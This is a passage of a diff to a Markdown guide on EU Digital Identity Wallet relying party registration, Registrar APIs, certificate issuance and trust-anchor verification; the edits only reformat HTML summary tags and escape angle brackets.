         identifier : string [1..1]
     }
 
     class Policy {
-        <<TS2 §2.9.5>>
+        &lt;&lt;TS2 §2.9.5>>
         type : string [1..1]
         policyURI : string [1..1]
     }
@@ -1261,7 +1264,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Relying Party submits registration application to Registrar</strong></summary>
+<details>
+<summary><strong>1. Relying Party submits registration application to Registrar</strong></summary>
 
 The Relying Party submits a registration application to the Registrar in its Member State. This submission formalizes its intent to request specific attributes (such as PID or SCA) from Wallet Users. While the API for submission (`POST /wrp`) varies per Member State, the underlying data model standardizes across the EU (TS5, TS6).
 
@@ -1292,7 +1296,8 @@ The Relying Party submits a registration application to the Registrar in its Mem
 ```
 
 </details>
-<details><summary><strong>2. Registrar validates application</strong></summary>
+<details>
+<summary><strong>2. Registrar validates application</strong></summary>
 
 The national Registrar systematically processes and validates the Relying Party's application against the policies mandated by eIDAS 2.0 (CIR 2025/848). This evaluation establishes the legal foundation for the Relying Party's operation within the EUDI ecosystem.
 
@@ -1320,7 +1325,8 @@ The validation routine executes four primary checks:
 ```
 
 </details>
-<details><summary><strong>3. Registrar confirms registration to Relying Party</strong></summary>
+<details>
+<summary><strong>3. Registrar confirms registration to Relying Party</strong></summary>
 
 Upon successful validation, the Registrar assigns the Relying Party a persistent, globally unique identifier—the `walletRelyingPartyId` (e.g., `urn:eudi:wrp:de:bank-example:12345`). The Registrar then commits the verified registration payload to the authoritative national register.
 
@@ -1356,7 +1362,8 @@ Location: https://api.registrar.de/wrp/urn:eudi:wrp:de:bank-example:12345
 > **Record Retention (Art. 10):** Registrars retain records of all Relying Party registration information—including all subsequent changes—for **10 years** (CIR 2025/848 Art. 10). This retention serves *ex post* monitoring, law enforcement investigations, and dispute handling. Relying Parties must ensure their entire registration history remains auditable.
 
 </details>
-<details><summary><strong>4. Relying Party requests WRPAC(s) from Access CA</strong></summary>
+<details>
+<summary><strong>4. Relying Party requests WRPAC(s) from Access CA</strong></summary>
 
 With a confirmed registration, the Relying Party must acquire its cryptographic identity—the Wallet Relying Party Access Certificate (WRPAC). The Relying Party generates a secure Elliptic Curve key pair (typically P-256 or P-384) within its infrastructure (e.g., an HSM or secure enclave). 
 
@@ -1391,7 +1398,8 @@ Certificate Request:
 > **One WRPAC per Relying Party Instance**: Each independent architectural component (e.g., the primary web backend, a distinct mobile API gateway, or distributed proximity terminals) requires its own WRPAC with isolated key material. While a single legal entity may hold dozens of WRPACs, the WRPAC's SAN domain must exactly match the `client_id` used in its OpenID4VP requests. This strict binding effectively neutralizes domain spoofing and phishing attacks.
 
 </details>
-<details><summary><strong>5. Access CA queries Registrar to verify Relying Party registration</strong></summary>
+<details>
+<summary><strong>5. Access CA queries Registrar to verify Relying Party registration</strong></summary>
 
 The Access Certificate Authority (Access CA) operates under strict issuance policies and validates certificate requests using national registries. Upon receiving the CSR, the Access CA acts as a systemic gatekeeper by actively querying the designated Registrar REST API (`GET /wrp/{identifier}`).
 
@@ -1414,7 +1422,8 @@ Accept: application/jwt
 > **CA-Registrar binding**: This verification step is what connects the PKI trust layer (X.509 certificates) to the regulatory trust layer (national registration). A WRPAC without a backing Registrar entry is invalid by design.
 
 </details>
-<details><summary><strong>6. Registrar confirms registration to Access CA</strong></summary>
+<details>
+<summary><strong>6. Registrar confirms registration to Access CA</strong></summary>
 
 The Registrar responds to the exact same `/wrp/{identifier}` API call by returning the Relying Party's registered data points. The response is a JWS-signed JSON Web Token containing the `data` payload, confirming the entity's active status to the Access CA.
 
@@ -1442,7 +1451,8 @@ eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InJlZ2lzdHJhci0xIn0.
 ```
 
 </details>
-<details><summary><strong>7. Access CA issues X.509 Access Certificate</strong></summary>
+<details>
+<summary><strong>7. Access CA issues X.509 Access Certificate</strong></summary>
 
 The Access CA mints the X.509 Access Certificate. Crucially, the WRPAC binds the Relying Party's public key to its legal identity. It follows the ETSI TS 119 475 profile, embedding the `walletRelyingPartyId` and the `memberState` into the certificate's subject or extensions.
 
@@ -1463,7 +1473,8 @@ Certificate:
 ```
 
 </details>
-<details><summary><strong>8. Access CA delivers WRPAC to Relying Party</strong></summary>
+<details>
+<summary><strong>8. Access CA delivers WRPAC to Relying Party</strong></summary>
 
 The Access CA cryptographically signs the X.509 Access Certificate and delivers the full certificate chain (Leaf → Intermediate CA → Root CA) back to the Relying Party. 
 
@@ -1487,7 +1498,8 @@ The Relying Party must immediately secure the corresponding private key within a
 Because WRPACs carry high systemic risk if compromised, they possess a strictly limited validity period (typically 1–2 years). Relying Parties must engineer automated cryptographic rotation pipelines to renew WRPACs prior to expiration, as Wallet Units forcefully reject expired certificates at runtime.
 
 </details>
-<details><summary><strong>9. Access CA logs WRPAC to Certificate Transparency</strong></summary>
+<details>
+<summary><strong>9. Access CA logs WRPAC to Certificate Transparency</strong></summary>
 
 Simultaneous to issuance, the Access CA actively submits the newly minted WRPAC to one or more EUDI-compliant Certificate Transparency (CT) logs (RFC 9162). The CT log responds with a cryptographic Signed Certificate Timestamp (SCT) asserting that the certificate is permanently recorded in an append-only ledger.
 
@@ -1518,7 +1530,8 @@ Certificate Extensions:
 > **Zero-Trust Fallback**: If a Wallet Unit encounters a WRPAC lacking valid SCTs, the standard behavior is an immediate protocol termination (Access Denied), preventing shadow-issued certificates from interrogating wallets.
 
 </details>
-<details><summary><strong>10. Relying Party requests WRPRC from Registration Cert Provider</strong></summary>
+<details>
+<summary><strong>10. Relying Party requests WRPRC from Registration Cert Provider</strong></summary>
 
 While the WRPAC governs cryptographic network access, it does not detail a Relying Party's *entitlements*. If supported by the Member State, the Relying Party proactively requests a Wallet Relying Party Registration Certificate (WRPRC) from an authorized Registration Cert Provider to bundle its authorized use-cases into a verifiable artifact.
 
@@ -1544,7 +1557,8 @@ Authorization: Bearer [RP_Service_Token]
 ```
 
 </details>
-<details><summary><strong>11. Registration Cert Provider queries Registrar for Relying Party data</strong></summary>
+<details>
+<summary><strong>11. Registration Cert Provider queries Registrar for Relying Party data</strong></summary>
 
 To construct the WRPRC accurately, the Registration Cert Provider must source the unadulterated ground truth regarding the Relying Party's entitlements. The Provider executes a direct query to the national Registrar's REST API, targeting the Relying Party's unique identifier.
 
@@ -1562,7 +1576,8 @@ This strict backend-to-backend integration guarantees that the WRPRC is minted u
 **Audit Telemetry:** The Provider generates a `RCP_REG_LOOKUP_DENIED` SIEM alert if the lookup is unsuccessful.
 
 </details>
-<details><summary><strong>12. Registrar returns registration data to Registration Cert Provider</strong></summary>
+<details>
+<summary><strong>12. Registrar returns registration data to Registration Cert Provider</strong></summary>
 
 The Registrar returns the exact same JWS-signed JWT containing the requested Relying Party's details. The Registration Cert Provider decodes this to extract the `intendedAttributes` array and `supportURI` to embed them directly into the certificate.
 
@@ -1597,7 +1612,8 @@ eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InJlZ2lzdHJhci0xIn0.
 ```
 
 </details>
-<details><summary><strong>13. Registration Cert Provider issues WRPRC</strong></summary>
+<details>
+<summary><strong>13. Registration Cert Provider issues WRPRC</strong></summary>
 
 The Registration Cert Provider mints the WRPRC as a deeply structured, self-contained JSON Web Token (JWT) encapsulating the full spectrum of the Relying Party's operational privileges. 
 
@@ -1638,7 +1654,8 @@ This token natively embeds critical user-facing transparency data:
 To restrict the window for malicious drift (where a Relying Party retains attributes after their lawful basis changes), the WRPRC enforces an ultra-short validity window (`exp` typically 3–6 months), forcing the Relying Party to repeatedly interface with the Provider to refresh its entitlements.
 
 </details>
-<details><summary><strong>14. Registration Cert Provider delivers WRPRC to Relying Party</strong></summary>
+<details>
+<summary><strong>14. Registration Cert Provider delivers WRPRC to Relying Party</strong></summary>
 
 The finalized WRPRC (formatted as a signed JWT) is securely delivered back to the Relying Party. The Relying Party caches this artifact in its backend infrastructure, alongside its cryptographic WRPAC, integrating it into every outbound presentation pipeline.
 
@@ -1803,7 +1820,8 @@ sequenceDiagram
     Note right of REG: ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ```
 
-<details><summary><strong>1. Relying Party sends presentation request to Wallet Unit</strong></summary>
+<details>
+<summary><strong>1. Relying Party sends presentation request to Wallet Unit</strong></summary>
 
 The Relying Party Instance initiates the presentation flow by transmitting a request to the user's Wallet Unit. Depending on the architectural modality, this is either an OpenID4VP JSON-secured Authorization Request (JAR) traversing the internet, or an ISO/IEC 18013-5 `DeviceRequest` transmitted over BLE/NFC. 
 
@@ -1833,7 +1851,8 @@ In this specific scenario, the Relying Party **omits** the Wallet Relying Party 
 > **Offline Bypass**: If the Relying Party *had* embedded a WRPRC, the Wallet Unit could parse the `intendedAttributes` directly from the certificate payload, entirely bypassing the synchronous REST API network hops to the Registrar and skipping straight to user consent.
 
 </details>
-<details><summary><strong>2. Wallet Unit authenticates Relying Party Instance via WRPAC</strong></summary>
+<details>
+<summary><strong>2. Wallet Unit authenticates Relying Party Instance via WRPAC</strong></summary>
 
 Upon receiving the presentation request, the Wallet Unit enters a strict cryptographic verification phase. It must unequivocally prove that the Relying Party operating the endpoint (`client_id`) legally owns the private key that signed the request.
 
@@ -1858,7 +1877,8 @@ This procedure authenticates **who** the Relying Party is, but crucially, it doe
 > **Hard Protocol Termination**: An unauthenticated Relying Party represents a severe systemic threat, irrespective of the attributes it is attempting to access.
 
 </details>
-<details><summary><strong>3. Wallet Unit queries Registrar API for intended use</strong></summary>
+<details>
+<summary><strong>3. Wallet Unit queries Registrar API for intended use</strong></summary>
 
 The Wallet Unit constructs an HTTP GET request to the Registrar's `check-intended-use` endpoint — the lightweight boolean check designed specifically for real-time Wallet queries during presentation (EUDI TS5 OpenAPI 3.1). The query parameters map directly from the Relying Party's presentation request:
 
@@ -1885,7 +1905,8 @@ For multi-attribute requests, the Wallet Unit should either issue **one query pe
 > **Offline fallback**: If the Registrar is unreachable (no internet, DNS failure, timeout), the Wallet Unit should inform the User: *"Registration check unavailable — proceed at your own risk"*, and allow the User to decide. The Wallet Unit should NOT silently proceed without the check.
 
 </details>
-<details><summary><strong>4. Registrar API returns signed intended use verification</strong></summary>
+<details>
+<summary><strong>4. Registrar API returns signed intended use verification</strong></summary>
 
 The Registrar API returns a `200 OK` response with `Content-Type: application/jwt` — a JWS compact serialisation signed with the Registrar's private key. The `x-jku-url` response header points to the Registrar's JWKS for signature verification. The JWS payload conforms to the `SignedIntendedUseCheckResult` schema:
 
@@ -1924,7 +1945,8 @@ When the Relying Party requests an attribute it is **not** registered for, the r
 > **JWS signing rationale**: The Registrar signs every response to prevent man-in-the-middle attacks where a network adversary could replace a `false` response with `true`, tricking the User into sharing data with an unregistered Relying Party.
 
 </details>
-<details><summary><strong>5. Wallet Unit displays verified Relying Party attributes to User</strong></summary>
+<details>
+<summary><strong>5. Wallet Unit displays verified Relying Party attributes to User</strong></summary>
 
 If the Registrar API responds with `isRegistered: true`, the Wallet Unit's UI transitions to the presentation consent screen, heavily augmenting the display with positive trust indicators. This UI signifies that the Relying Party has successfully navigated the regulatory gauntlet and is explicitly authorized to access the requested attributes.
 
@@ -1947,7 +1969,8 @@ The Wallet UI dynamically maps the validated data to the screen:
 This affirmative signal serves as the primary psychological anchor for the User, assuring them that the interaction is shielded by eIDAS 2.0 regulatory oversight, thereby dramatically increasing conversion rates during complex onboarding flows.
 
 </details>
-<details><summary><strong>6. Wallet Unit displays severity warning for unmatched attributes to User</strong></summary>
+<details>
+<summary><strong>6. Wallet Unit displays severity warning for unmatched attributes to User</strong></summary>
 
 If the Registrar API responds with `isRegistered: false`—indicating a mismatch between the attributes requested in the JAR/DeviceRequest and the attributes approved in the national registry—the Wallet Unit MUST instantly interrupt the standard UX flow and render a severe warning.
 
@@ -1971,7 +1994,8 @@ Crucially, under the sovereignty principles of eIDAS 2.0 (Art. 5a(4)), this warn
 **Audit Telemetry:** The Wallet Unit logs an `UNMATCHED_ATTRIBUTE_WARNING_DISPLAYED` event.
 
 </details>
-<details><summary><strong>7. User authorizes or aborts credential presentation</strong></summary>
+<details>
+<summary><strong>7. User authorizes or aborts credential presentation</strong></summary>
 
 Positioned as the definitive gatekeeper, the User absorbs the UI trust indicators (✅ or ⚠️) and exercises their sovereign right to authorize or abort the transaction. The European digital identity paradigm dictates that cryptographic transmission cannot occur without this explicit, granular consent gate.
 
@@ -2000,7 +2024,8 @@ response=eyJhbGciOiJFUzI1NiIs...[VP Token Payload]...&state=af0ifjsldkj
 
 The following examples are derived from the official TS5 OpenAPI 3.1 specification (`ts5-openapi31-registrar-api.yml`). All `GET` responses are returned as `application/jwt` (JWS compact serialisation) with an `x-jku-url` header pointing to the Registrar's JWKS.
 
-<details><summary><strong>GET /wrp?identifier={id}</strong> — Query registered WRPs by identifier</summary>
+<details>
+<summary><strong>GET /wrp?identifier={id}</strong> — Query registered WRPs by identifier</summary>
 
 ```http
 GET /wrp?identifier=5299001GCLKH6FPVJW75 HTTP/1.1
@@ -2019,7 +2044,7 @@ The JWS payload, once decoded and signature-verified against the Registrar's JWK
   "data": [
     {
       "providerType": 1,
-      "x5c": "<base64-encoded WRPAC>",
+      "x5c": "&lt;base64-encoded WRPAC>",
       "policy": [
         {
           "policyURI": "https://example-bank.de/privacy",
@@ -2114,7 +2139,8 @@ The JWS payload, once decoded and signature-verified against the Registrar's JWK
 
 
 </details>
-<details><summary><strong>GET /wrp/{identifier}</strong> — Retrieve a single WRP by identifier</summary>
+<details>
+<summary><strong>GET /wrp/{identifier}</strong> — Retrieve a single WRP by identifier</summary>
 
 ```http
 GET /wrp/5299001GCLKH6FPVJW75 HTTP/1.1
@@ -2145,7 +2171,8 @@ Response (`200 OK`): Same as the `GET /wrp` response, but the JWS payload confor
 
 
 </details>
-<details><summary><strong>GET /wrp/check-intended-use</strong> — Lightweight boolean check (used by Wallet Units)</summary>
+<details>
+<summary><strong>GET /wrp/check-intended-use</strong> — Lightweight boolean check (used by Wallet Units)</summary>
 
 This is the most critical endpoint for real-time RP verification during presentation. The Wallet Unit calls it to determine whether the RP is registered for the specific credential and claim it is requesting.
 
@@ -2186,13 +2213,14 @@ When the RP requests an attribute it is **not** registered for:
 
 
 </details>
-<details><summary><strong>PUT /wrp</strong> — Update existing WRP registration (authenticated)</summary>
+<details>
+<summary><strong>PUT /wrp</strong> — Update existing WRP registration (authenticated)</summary>
 
 ```http
 PUT /wrp HTTP/1.1
 Host: registrar.example-ms.de
 Content-Type: application/json
-Authorization: Bearer <MS-specific auth token>
+Authorization: Bearer &lt;MS-specific auth token>
 
 {
   "providerType": 1,
@@ -2238,12 +2266,13 @@ Response (`200 OK`): The updated WRP as a JWS-signed `SignedWRP` object. `400` i
 
 
 </details>
-<details><summary><strong>DELETE /wrp/{identifier}</strong> — Delete a WRP registration (authenticated)</summary>
+<details>
+<summary><strong>DELETE /wrp/{identifier}</strong> — Delete a WRP registration (authenticated)</summary>
 
 ```http
 DELETE /wrp/5299001GCLKH6FPVJW75 HTTP/1.1
 Host: registrar.example-ms.de
-Authorization: Bearer <MS-specific auth token>
+Authorization: Bearer &lt;MS-specific auth token>
 ```
 
 Response: `204 No Content` on success, `404 Not Found` if the identifier does not match.
@@ -2659,7 +2688,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Wallet Unit delivers presentation response to Relying Party Instance</strong></summary>
+<details>
+<summary><strong>1. Wallet Unit delivers presentation response to Relying Party Instance</strong></summary>
 
 The Wallet Unit delivers the presentation response to the Relying Party, containing the requested Person Identification Data (PID) and any accompanying attestations (e.g., QEAAs, PuB-EAAs). The response format depends on the presentation channel:
 
@@ -2681,7 +2711,8 @@ response=eyJhbGciOiJFQ0RILUVTI...[Encrypted JWE]...&state=xyz123
 ```
 
 </details>
-<details><summary><strong>2. Relying Party Instance verifies PID issuer signature</strong></summary>
+<details>
+<summary><strong>2. Relying Party Instance verifies PID issuer signature</strong></summary>
 
 The Relying Party cryptographically verifies the PID's issuer signature to confirm it was legitimately issued by a notified PID Provider. The verification method depends on the credential format:
 
@@ -2699,7 +2730,8 @@ In both formats, the Relying Party must resolve the correct LoTE by identifying 
 > **Why drop immediately**: An invalid signature implies either malicious tampering or a severe misconfiguration on the issuer side. The Relying Party must halt to prevent ingesting poisoned data.
 
 </details>
-<details><summary><strong>3. Relying Party Instance checks PID revocation status</strong></summary>
+<details>
+<summary><strong>3. Relying Party Instance checks PID revocation status</strong></summary>
 
 The Relying Party queries the PID Provider's Token Status List endpoint (IETF draft-ietf-oauth-status-list) to ensure the presented PID has not been suspended or revoked. The Relying Party extracts the `status` claim from the PID credential:
 
@@ -2723,7 +2755,8 @@ The Relying Party fetches the Status List Token JWT from the `uri`, decompresses
 > **PID revocation as Wallet Unit health signal**: This check is more significant than a simple credential validity check — see step 4 for why.
 
 </details>
-<details><summary><strong>4. Status List confirms PID validity to Relying Party Instance</strong></summary>
+<details>
+<summary><strong>4. Status List confirms PID validity to Relying Party Instance</strong></summary>
 
 The Status List confirms the PID's status is VALID (bit = 0). This carries a deeper trust implication than typical credential validity: PID Providers are **legally obligated** (CIR 2024/2977 Art. 5.4(b)) to cascade-revoke PIDs when the underlying Wallet Unit Attestation (WUA) is revoked or the Wallet Unit is compromised. This means a valid PID serves as **indirect cryptographic proof that the Wallet Unit itself remains trustworthy**. The Relying Party can therefore trust that:
 
@@ -2746,7 +2779,8 @@ Accept: application/statuslist+jwt
 > **Revocation propagation delay**: There is a window between WUA revocation and PID cascading revocation, bounded by the PID Provider's status list refresh interval (typically 15 minutes to 1 hour). For ultra-high-assurance scenarios (e.g., qualified electronic signature creation), Relying Parties should perform additional checks beyond PID status — see §15 (SCA attestations) for complementary verification.
 
 </details>
-<details><summary><strong>5. Relying Party Instance verifies device binding</strong></summary>
+<details>
+<summary><strong>5. Relying Party Instance verifies device binding</strong></summary>
 
 The Relying Party verifies the presenter's proof of possession — cryptographic evidence that the credential was presented by the device that originally received it from the PID Provider. This prevents credential cloning, forwarding, and replay attacks. The verification method depends on the format:
 
@@ -2766,7 +2800,8 @@ The Relying Party verifies the presenter's proof of possession — cryptographic
 > **Criticality of Device Binding**: This is the most critical security check — it proves that the credential holder is the exact same cryptographic entity that received the credential from the issuer during activation.
 
 </details>
-<details><summary><strong>6. Relying Party Instance verifies attestation signatures & revocation</strong></summary>
+<details>
+<summary><strong>6. Relying Party Instance verifies attestation signatures & revocation</strong></summary>
 
 If additional attestations were presented alongside the PID (e.g., a QEAA for professional qualifications, a PuB-EAA for address data, or an mDL), the Relying Party processes each one through the same verification pipeline (steps 2–5). For each attestation:
 
@@ -2781,7 +2816,8 @@ If additional attestations were presented alongside the PID (e.g., a QEAA for pr
 > **Attestation revocation asymmetry**: Unlike PID Providers, Attestation Providers are **NOT obligated** to cascade-revoke when the WUA is revoked (ARF HLR AS-WP-38-019). They MAY choose to do so, but are only required to publish their cascading revocation policy. This means that after a Wallet Unit compromise, the PID becomes invalid immediately (step 3–4), but EAAs may remain valid depending on each Attestation Provider's individual policy. Relying Parties performing high-assurance verifications should check the PID status as the primary trust signal — see the note following step 7 for the cascading revocation asymmetry detail.
 
 </details>
-<details><summary><strong>7. Relying Party Instance verifies combined presentation binding</strong></summary>
+<details>
+<summary><strong>7. Relying Party Instance verifies combined presentation binding</strong></summary>
 
 In multi-attestation scenarios (where the `vp_token` contains more than one credential), the Relying Party must verify that all presented credentials belong to the same User and were presented from the same Wallet Unit. This prevents a "credential cocktail" attack where attributes from different Users or devices are combined:
 
@@ -2802,7 +2838,7 @@ If a WSCA binding proof is available (future feature — ARF v2.8 §7.6.3), the 
 
 #### 5.4.3 Wallet Instance Attestation (WIA): Also Not Seen by RPs
 
-Similarly, the **Wallet Instance Attestation (WIA)** — a short-lived (< 24 hours) attestation about the Wallet Instance — is presented only to Providers, not to RPs.
+Similarly, the **Wallet Instance Attestation (WIA)** — a short-lived (&lt; 24 hours) attestation about the Wallet Instance — is presented only to Providers, not to RPs.
 
 However, this design is subject to active policy debate. The current CIR 2024/2982 mandates that wallets support protocols for RPs to request WUAs for wallet authentication. A proposed amendment of CIR 2024/2982 would replace this with a narrower mechanism: RPs would receive **Wallet Instance Attestations** instead of Wallet Unit Attestations. The WIA attests only to the integrity of the wallet instance (not the full WSCA/WSCD properties), with content specified in OID4VP Appendix E including the `eudi_wallet_info` claim. This proposal is motivated by data minimisation: WUAs expose WSCD-level details that RPs have no business need to know, and exposing them would enable linkability across presentations.
 
@@ -2901,7 +2937,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Relying Party Backend discovers LoTE URLs via Member State registry</strong></summary>
+<details>
+<summary><strong>1. Relying Party Backend discovers LoTE URLs via Member State registry</strong></summary>
 
 As a one-time bootstrapping step, the Relying Party queries the centralised European **Common Trust Infrastructure** — maintained by the European Commission — to discover the authoritative URLs for all Member State Trusted Lists and Lists of Trusted Entities (LoTEs). The Common Trust Infrastructure acts as the DNS root equivalent for the EUDI trust ecosystem: every trust anchor in the system can be traced back through this single entry point.
 
@@ -2916,7 +2953,8 @@ The Relying Party should call this endpoint during initial deployment and period
 **Audit Telemetry:** The Relying Party logs a `CTI_DISCOVERY_INITIATED` event to track trust bootstrapping.
 
 </details>
-<details><summary><strong>2. Common Trust Infrastructure returns List of all LoTE/Trusted List URLs</strong></summary>
+<details>
+<summary><strong>2. Common Trust Infrastructure returns List of all LoTE/Trusted List URLs</strong></summary>
 
 The Common Trust Infrastructure responds with the official directory mapping each Member State to its respective LoTE publication endpoints. The response includes separate URLs for each LoTE type (§5.5.2):
 
@@ -2945,7 +2983,8 @@ The Relying Party typically needs only the **PID Provider LoTE** and the **QEAA/
 **Audit Telemetry:** The Relying Party logs a `CTI_DISCOVERY_SUCCESS` event containing the enumeration of available Member State lists.
 
 </details>
-<details><summary><strong>3. Relying Party Backend fetches PID Provider LoTE</strong></summary>
+<details>
+<summary><strong>3. Relying Party Backend fetches PID Provider LoTE</strong></summary>
 
 The Relying Party sends an HTTP GET to the specific Member State's PID Provider LoTE endpoint to download the list of authorised PID Providers and their associated public keys. The LoTE is published in the **OpenID Federation** format (OID-FED), where each entity is represented as an Entity Statement JWT:
 
@@ -2962,7 +3001,8 @@ The Relying Party should include conditional request headers (`If-None-Match` / 
 > **Latency consideration**: LoTE fetches add network latency to the bootstrapping process. Relying Parties should fetch LoTEs asynchronously during startup and cache them aggressively, rather than fetching on-demand during presentation verification.
 
 </details>
-<details><summary><strong>4. LoTE Provider returns signed LoTE containing PID Provider trust anchors</strong></summary>
+<details>
+<summary><strong>4. LoTE Provider returns signed LoTE containing PID Provider trust anchors</strong></summary>
 
 The LoTE Provider returns a cryptographically signed document (the LoTE) containing the official trust anchors (public keys and entity identifiers) for all active, legitimate PID Providers in that jurisdiction. OpenID Federation is the standard format, where the payload is an `Entity Statement` JWT:
 
@@ -3000,7 +3040,8 @@ The `jwks.keys` array contains the PID Provider's public keys used for signing P
 > **Multiple PID Providers per MS**: A Member State may have multiple notified PID Providers (e.g., Germany could designate Bundesdruckerei and a second provider). The LoTE contains Entity Statements for all of them. The Relying Party must store all trust anchors and select the correct one at verification time (step 7) based on the `iss` claim in the presented PID.
 
 </details>
-<details><summary><strong>5. Relying Party Backend verifies LoTE signature</strong></summary>
+<details>
+<summary><strong>5. Relying Party Backend verifies LoTE signature</strong></summary>
 
 Because the LoTE serves as the absolute root of trust for all subsequent User presentations, the Relying Party must cryptographically prove that the downloaded OID-FED Entity Statement was genuinely signed by the authoritative Member State LoTE Provider and has not suffered transit tampering or DNS hijacking.
 
@@ -3027,7 +3068,8 @@ The verification routine must strictly evaluate:
 > **Zero-Trust Fallback**: In a failure scenario, the Relying Party should retain its previously cached (known-good) LoTE until the issue resolves.
 
 </details>
-<details><summary><strong>6. Relying Party Backend caches trust anchors locally</strong></summary>
+<details>
+<summary><strong>6. Relying Party Backend caches trust anchors locally</strong></summary>
 
 Once the LoTE signature is verified, the Relying Party unpacks the `jwks` array from the Entity Statement and securely ingests the trust anchors into its highly-available local cache (e.g., Redis, DynamoDB, or a secure hardware enclave). 
 
@@ -3058,7 +3100,8 @@ The cache architecture must fulfill highly specific technical constraints:
 > **Provider Revocation Handling**: If a previously trusted PID Provider is entirely removed from a newly published LoTE (indicating suspension or compromise), the Relying Party's caching logic must instantly purge or blacklist that provider's keys, immediately halting acceptance of their credentials.
 
 </details>
-<details><summary><strong>7. Relying Party Backend looks up trust anchor for PID Provider</strong></summary>
+<details>
+<summary><strong>7. Relying Party Backend looks up trust anchor for PID Provider</strong></summary>
 
 During the live millisecond-window of a User presentation (§9.2 or §13.4), the Relying Party must dynamically pair the incoming credential with its root of trust. The Relying Party extracts the unverified issuer identifier directly from the presented credential and probes its local cache.
 
@@ -3085,7 +3128,8 @@ def resolve_trust_anchor(presented_credential):
 > **Foreign Cache Miss Mechanics**: In highly distributed cross-border scenarios, a cache miss might simply indicate the Relying Party hasn't fetched a specific *foreign* Member State's LoTE yet. Advanced Relying Party implementations may trigger a deferred asynchronous LoTE fetch, though this drastically delays the User UX.
 
 </details>
-<details><summary><strong>8. Relying Party Backend verifies PID signature using the trust anchor</strong></summary>
+<details>
+<summary><strong>8. Relying Party Backend verifies PID signature using the trust anchor</strong></summary>
 
 Armed with the fiercely guarded, locally cached trust anchor, the Relying Party executes the definitive cryptographic verification over the User's presented PID.
 
@@ -3163,9 +3207,9 @@ The trust chain resolution process (OID-FED §11) enables a Wallet Instance to v
 | Endpoint | Path | Role | Required For |
 |:---------|:-----|:-----|:-------------|
 | Entity Configuration | `GET /.well-known/openid-federation` | Self-published metadata and keys | All entities |
-| Fetch (Subordinate Statement) | `GET /fetch?sub=<entity_id>` | Return Subordinate Statement about a subordinate | Trust Anchor, Intermediate |
+| Fetch (Subordinate Statement) | `GET /fetch?sub=&lt;entity_id>` | Return Subordinate Statement about a subordinate | Trust Anchor, Intermediate |
 | Subordinate Listing | `GET /list` | List all subordinates | Trust Anchor, Intermediate |
-| Resolve | `GET /resolve?sub=<entity_id>&trust_anchor=<ta_id>` | Resolve trust chain and return final metadata | Trust Anchor (optional) |
+| Resolve | `GET /resolve?sub=&lt;entity_id>&trust_anchor=&lt;ta_id>` | Resolve trust chain and return final metadata | Trust Anchor (optional) |
 | Trust Mark Status | `POST /status?sub=...&trust_mark_id=...` | Check Trust Mark validity | Trust Anchor, Intermediate |
 
 #### 5.5.6 Trust Chain Resolution: Wallet Verifying an RP (OID-FED Model)
@@ -3226,7 +3270,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Relying Party sends signed presentation request to Wallet Instance</strong></summary>
+<details>
+<summary><strong>1. Relying Party sends signed presentation request to Wallet Instance</strong></summary>
 
 The Relying Party initiates the flow by sending a credential presentation request to the Wallet Instance. In the OID-FED trust model, the Relying Party's `client_id` uses the `openid_federation` scheme (rather than `x509_hash` used in the WRPAC model). The request is signed with the Relying Party's federation entity key. The Wallet Instance does not yet trust this Relying Party — it must resolve the trust chain before processing the request.
 
@@ -3243,21 +3288,24 @@ Host: wallet.example.eu
 ```
 
 </details>
-<details><summary><strong>2. Wallet Instance fetches Relying Party's Entity Configuration</strong></summary>
+<details>
+<summary><strong>2. Wallet Instance fetches Relying Party's Entity Configuration</strong></summary>
 
 The Wallet Instance sends an HTTP GET to the Relying Party's `/.well-known/openid-federation` endpoint. This is the standard OID-FED discovery mechanism — every entity in the federation publishes its Entity Configuration at this well-known path. The request uses the `Accept: application/entity-statement+jwt` media type.
 
 **Audit Telemetry:** The Wallet Instance logs an `RP_ENTITY_CONFIGURATION_FETCH_INITIATED` event to track trust discovery.
 
 </details>
-<details><summary><strong>3. Relying Party returns Entity Configuration JWT</strong></summary>
+<details>
+<summary><strong>3. Relying Party returns Entity Configuration JWT</strong></summary>
 
 The Relying Party responds with its self-signed Entity Configuration — a JWT containing: `metadata` (the Relying Party's declared capabilities, including `openid_credential_verifier` with VP formats and requested scopes), `jwks` (the Relying Party's public keys), `authority_hints` (URLs of superior entities in the federation hierarchy), and `trust_marks` (optional attestations of Relying Party authorisation). The Wallet Instance uses `authority_hints` in the next step to walk upward through the trust hierarchy.
 
 **Artifact Produced:** Relying Party Entity Configuration (JWT).
 
 </details>
-<details><summary><strong>4. Wallet Instance verifies Relying Party Entity Configuration self-signature</strong></summary>
+<details>
+<summary><strong>4. Wallet Instance verifies Relying Party Entity Configuration self-signature</strong></summary>
 
 The Wallet Instance verifies that the Entity Configuration JWT was signed by one of the keys declared in its own `jwks` field. This is a self-consistency check — it proves the JWT was not tampered with in transit, but does not yet establish trust. Trust is established only after the full chain (steps 5–14) is validated.
 
@@ -3266,47 +3314,54 @@ The Wallet Instance verifies that the Entity Configuration JWT was signed by one
 **Audit Telemetry:** The Wallet Instance logs an `RP_ENTITY_CONFIGURATION_SIGNATURE_VERIFIED` event or failure alert.
 
 </details>
-<details><summary><strong>5. Wallet Instance extracts authority_hints from Relying Party Entity Configuration</strong></summary>
+<details>
+<summary><strong>5. Wallet Instance extracts authority_hints from Relying Party Entity Configuration</strong></summary>
 
 The Wallet Instance parses the `authority_hints` array from the Relying Party's Entity Configuration. Each entry is the URL of a superior entity (Intermediate or Trust Anchor) that has issued a Subordinate Statement about the Relying Party. In a single-level federation, this points directly to the Trust Anchor. In the Italian model, it typically points to an Intermediate (e.g., a sector-specific registrar).
 
 </details>
-<details><summary><strong>6. Wallet Instance fetches Intermediate Entity Configuration</strong></summary>
+<details>
+<summary><strong>6. Wallet Instance fetches Intermediate Entity Configuration</strong></summary>
 
